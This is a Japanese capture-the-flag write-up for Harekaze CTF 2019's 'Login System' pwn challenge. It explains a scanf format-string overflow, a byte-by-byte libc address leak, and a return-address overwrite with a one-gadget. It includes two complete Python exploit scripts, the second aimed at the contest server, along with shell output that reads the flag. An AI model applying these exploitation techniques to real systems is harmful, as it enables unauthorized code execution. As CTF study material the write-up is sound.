# [pwn 250pts] Login System - Harekaze CTF 2019
64ビットで基本無効です。
```
$ checksec -f login
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      Yes	0		3	login
```

はじめにcharsetsのサイズが聞かれ、次にそのサイズだけcharsetsを入力できます。
ここで入力したcharsetsはsprintfで`"%79s[" + charsets + "]"`のように結合され、次のscanfでこれが書式文字列として利用されます。要するに指定した文字セットだけを利用して79文字入力できるわけですが、charsetsが自由に指定できるので例えば`a]%1000s[^p`のようにしてやると`%79s[a]%1000s[^p]`となり、スタック上にある2つ目のポインタに1000文字書き込むことができてオーバーフローできます。
問題が2つあって、1つ目はSSPが有効なことと、2つ目はlibcのアドレスが分からないことです。
1つ目の問題は割と簡単に解決できます。
scanfが呼ばれる際のスタックの様子は次のようになっています。
```
pwndbg> x/64xg $rsp
0x7fffffffdc90:	0x0000000000000001	0x000000000000004f
0x7fffffffdca0:	0x0000000000636261	0x000000006562b026
0x7fffffffdcb0:	0x00007ffff7ffea98	0x00007fffffffddf8
0x7fffffffdcc0:	0x00007fffffffde30	0x00007ffff7ffe710
0x7fffffffdcd0:	0x0000000000000000	0x00007ffff7de01ef
0x7fffffffdce0:	0x0000000000000000	0x00007fffffffde30
0x7fffffffdcf0:	0x0000000000636261	0x0000000000000000
0x7fffffffdd00:	0x0000000000000000	0x00007ffff7ffe710
0x7fffffffdd10:	0x00007ffff7b97787	0x0000000000000380
0x7fffffffdd20:	0x00007fffffffdd50	0x00007fffffffdd60
0x7fffffffdd30:	0x00007ffff7ffea98	0x0000000000000000
0x7fffffffdd40:	0x0000000000000000	0x0000000000000000
0x7fffffffdd50:	0x00000000ffffffff	0x0000000000000000
0x7fffffffdd60:	0x00007ffff7ffa268	0x00007ffff7ffe710
0x7fffffffdd70:	0x0000000000000000	0x0000000000000000
0x7fffffffdd80:	0x0000000000000000	0x00000000756e6547
0x7fffffffdd90:	0x5d6362615b393725	0x00007ffff7dd7600
0x7fffffffdda0:	0x00007fffffffde08	0x0000000000f0b5ff
0x7fffffffddb0:	0x0000000000000001	0x0000555555554c3d
0x7fffffffddc0:	0x00007ffff7de59a0	0x0000000000000000
0x7fffffffddd0:	0x0000555555554bf0	0x0000555555554880
0x7fffffffdde0:	0x00007fffffffded0	0x27ac16b8e8483b00
0x7fffffffddf0:	0x0000555555554bf0	0x00007ffff7a05b97
0x7fffffffde00:	0x0000000000000001	0x00007fffffffded8
...
```
見ると分かるように0x7fffffffddf8にリターンアドレスがあるのですが、これを指すポインタが偶然にもスタック上0x7fffffffdcb8に存在します。
ということで、`%11$lx`のような書式文字列でリターンアドレスを直接書き換えられます。
さて、問題はどうやってlibcのアドレスをリークさせるかです。
今回はcharsetsのサイズが指定できて、かつcharsetsの読み込みは独自実装の関数を使っています。
この関数は改行文字までか、指定されたサイズ限界までを読み込み、かつサイズ限界まで読み取った場合は終端をNULLで埋めません。
ということは、スタック上にあるアドレスをcharsetsに含ませることができるのです。
使えない文字を入力するとエラーになるので、これを利用して使える文字を特定できます。
先程の例だと、最初は0x00007ffff7de01efの0xef, 0x01, 0xde, 0xf7, 0xff, 0x7fが使えますが、次にサイズを1バイト増やせば0x00007ffff7de01??となり0xefが使えなくなります。
このようにして1バイトずつ特定していけば、libcのアドレスを特定できるでしょう。

```python
from ptrlib import *

libc = ELF("./libc.so.6")
sock = Process("./login")

## leak libc base
leaked_addr = []
pre_candidate = []
ofs = 0x38
for l in range(ofs, ofs + 6):
    candidate = []
    for c in range(0x100):
        if c == ord('\n') or c == ord('\r') or c == ord('A'): continue
        #print(sock.recv())
        sock.recvuntil(": ")
        sock.sendline("{}".format(l))
        sock.recvuntil(": ")
        sock.send("A" * l)
        sock.recvuntil(": ")
        sock.sendline(chr(c))
        r = sock.recvline()
        if b'Invalid password' not in r:
            candidate.append(c)
        if len(candidate) >= ofs + 6 - l:
            break
    for c in pre_candidate:
        if c not in candidate:
            leaked_addr.append(c)
            break
    pre_candidate = list(candidate)
leaked_addr.append(candidate[0])
addr = u64(bytes(leaked_addr))
libc_base = addr - 0x3fc1ef
dump("libc base = " + hex(libc_base))

sock.interactive()
```

できました。
```
$ python solve.py 
[+] Process: Successfully created new process (PID=9048)
[ptrlib] 0x7f4edf6e51ef
[ptrlib] libc base = 0x7f4edf2e9000
[ptrlib]$
```

しかしこれだとリターンアドレスを指しているポインタがAで上書きされてしまうので、偶然その前にあったlibcのポインタを利用する方針に変えました。
これでリターンアドレスを指すポインタをリークすることなくone gadgetが書き込めます。

```python
from ptrlib import *

libc = ELF("./libc.so.6")
#sock = Process("./login")
sock = Socket("problem.harekaze.com", 20002)
one_gadget = 0x4f322

## leak libc base
leaked_addr = []
pre_candidate = []
ofs = 0x10
for l in range(ofs, ofs + 6):
    candidate = []
    for c in range(0x100):
        if c == ord('\n') or c == ord('\r') or c == ord('A'): continue
        sock.recvuntil(": ")
        sock.sendline("{}".format(l))
        sock.recvuntil(": ")
        sock.send("A" * l)
        sock.recvuntil(": ")
        sock.sendline(chr(c))
        r = sock.recvline()
        if b'Invalid password' not in r:
            candidate.append(c)
            sock.sendline("abc123")
        if len(candidate) >= ofs + 6 - l:
            break
    for c in pre_candidate:
        if c not in candidate:
            leaked_addr.append(c)
            break
    pre_candidate = list(candidate)
leaked_addr.append(candidate[0])
addr = u64(bytes(leaked_addr))
libc_base = addr - 0x61aa98
dump("libc base = " + hex(libc_base))

## overwrite the return address
sock.recvuntil(": ")
sock.sendline("79")
sock.recvuntil(": ")
sock.sendline("a]%11$llu")
sock.recvuntil(": ")
sock.send("a ")
sock.sendline(str(libc_base + one_gadget))

## get the shell!
sock.sendline("79")
sock.sendline("a")
sock.sendline("a")
sock.sendline("a")
sock.recvuntil("bye.\n")

sock.interactive()
```

できたー。
```
$ python solve.py 
[+] Socket: Successfully connected to problem.harekaze.com:20002
[ptrlib] libc base = 0x7f579b5fd000
[ptrlib]$ ls /home
login
[ptrlib]$ cat /home/login/flag
HarekazeCTF{sc4nf_1s_fr3x1b1e_w17h_3xpl017}
[ptrlib]$
```

シェルが取れるまで数分かかりました。
そりゃalarm付いてたら解けないわけだ。（運営が途中でalarmなしのバイナリに変更した。）

# 感想
よくこんな問題を思いつくなぁ。
見たことない形式で面白かったです。
